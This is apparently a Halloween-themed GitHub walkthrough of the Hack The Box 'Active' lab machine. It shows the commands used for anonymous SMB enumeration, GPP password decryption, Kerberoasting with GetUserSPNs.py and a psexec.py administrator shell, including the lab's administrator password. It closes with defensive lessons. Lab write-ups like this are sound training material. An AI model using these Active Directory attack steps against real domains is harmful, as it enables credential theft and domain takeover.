# HTB_Active
My walkthrough for the HTB Active Machine

🎃 HTB Active Machine Write-Up 🎃
A Spooky Journey Through Kerberoasting & GPP Exploitation
Jack O'Lantern Divider

📜 Table of Contents

1: Overview

2: Attack Path

3: Key Exploits

4: Lessons Learned

5: References

6: Final Flags

👻 1: Overview
Machine Name: Active (HTB - Easy)
OS: Windows (Active Directory)
IP: 10.129.41.241
Difficulty: ★★☆☆☆


"A haunted Active Directory box with hidden treats—Kerberoasting and GPP passwords!"

🧟 2: Attack Path

1️⃣ Enumeration
Nmap Scan: Found SMB, LDAP, Kerberos.

![1 nmap](https://github.com/user-attachments/assets/120213ff-2b24-48d9-b69b-a574889385f8)


Anonymous SMB Access: Found Replication share with Groups.xml.

![3 groups xml](https://github.com/user-attachments/assets/7f119aba-a0a7-4c98-b191-e77f89387f97)


```bash
smbclient -L //10.129.41.241
```
2️⃣ Exploitation
GPP Password Decryption:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```
Password: 🎃🎃🎃🎃🎃

![4 user pwd cracked](https://github.com/user-attachments/assets/4d3e0157-0f6f-4d91-acb2-b3e09b98ef0f)


Kerberoasting Attack:

```bash
GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.41.241 -request
```
Cracked Hash: 🎃🎃🎃🎃

3️⃣ Privilege Escalation
Admin Shell via psexec.py:

![6 admin hash](https://github.com/user-attachments/assets/00ea11be-0cc8-479d-ad3b-e754bdd0ec3f)


```bash
python3 psexec.py active.htb/administrator:Ticketmaster1968@10.129.41.241
```
Result: nt authority\system

🎃 3: Key Exploits
Vulnerability	Exploit Method	Impact
Group Policy Preferences (GPP)	Decrypted Groups.xml password	Credential Leak
Kerberoasting	Cracked TGS ticket for Administrator	Domain Admin Access
SMB Misconfig	Anonymous Replication share access	Initial Foothold
Spooky GIF

💀 4: Lessons Learned

✅ Never store passwords in GPP files (Microsoft deprecated this for a reason!).

✅ Kerberoasting is deadly—always use strong service account passwords.

✅ Restrict SMB shares (Replication should not be world-readable).

📚 5: References

Kerberoasting Explained (ADSecurity) [link](https://adsecurity.org/?p=2293)

GPP Password Decryption (HackTricks) [link](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/group-policy-preferences)

Impacket GitHub [link](https://github.com/fortra/impacket)

Ghost Divider

🏴‍☠️ 6: Final Flags

user.txt: 🎃🎃🎃🎃🎃🎃

![5 user txt](https://github.com/user-attachments/assets/403bd635-f5dd-4f0e-90b6-5a16384f9dc9)


root.txt: 👻👻👻👻👻👻

![7 root flag](https://github.com/user-attachments/assets/0a2809cb-50c9-4b90-bc58-1843ed14948b)


👻 Happy Hacking!
"Like a ghost in the machine, you’ve conquered Active!"

🎃 Made with spooky vibes by Lantern

